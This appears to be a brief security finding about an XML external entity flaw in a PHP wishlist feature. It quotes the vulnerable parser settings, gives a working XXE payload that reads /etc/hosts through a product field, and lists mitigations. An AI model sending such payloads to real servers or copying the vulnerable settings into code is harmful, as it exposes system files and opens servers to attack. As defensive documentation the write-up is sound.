libxml_disable_entity_loader(false);
$wishlist = simplexml_load_string($xml_data, "SimpleXMLElement", LIBXML_NOENT);

When the XML is processed by simplexml_load_string with the LIBXML_NOENT option, the web 
app resolves external entities, allowing attackers access to sensitive files or allowing 
them to make unintended requests from the server.

PAYLOAD:
  <!--?xml version="1.0" ?-->
  <!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
  <wishlist>
    <user_id>1</user_id>
      <item>
        <product_id>&payload;</product_id>
      </item>
  </wishlist>

MITIGATION:
  Disable External Entity Loading -> Change to
    libxml_disable_entity_loader(true);

  Validate and Sanitise User Input -> Validate and sanitize received XML, scan for unusual strings
